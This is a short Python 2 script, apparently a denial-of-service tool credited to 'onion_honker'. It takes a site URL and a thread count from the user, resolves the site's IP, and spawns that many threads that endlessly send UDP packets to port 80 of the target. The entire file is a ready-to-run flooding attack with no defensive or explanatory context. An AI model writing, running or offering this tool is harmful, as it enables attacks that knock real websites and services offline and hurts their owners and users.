import time
import socket
import sys
import thread
print "Thank You onion_honker"
site = raw_input(" Site URL = ")
thread_count = input("Packet = ")

ip = socket.gethostbyname(site)

UDP_PORT = 80
MESSAGE = "ONION_HONKER"
print "UDP target IP:", ip
print "UDP target port:", UDP_PORT
print "Delay"
time.sleep(5)

def dos(i):
  while True:  
      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      sock.sendto(MESSAGE, (ip, UDP_PORT))
      print "PACKET SENT", site
    
for i in xrange(thread_count):
  try:
   thread.start_new_thread( dos , ("Thread-"+str(i),) )
  except KeyboardInterrupt:
      sys.exit(0)
while 1:
  pass
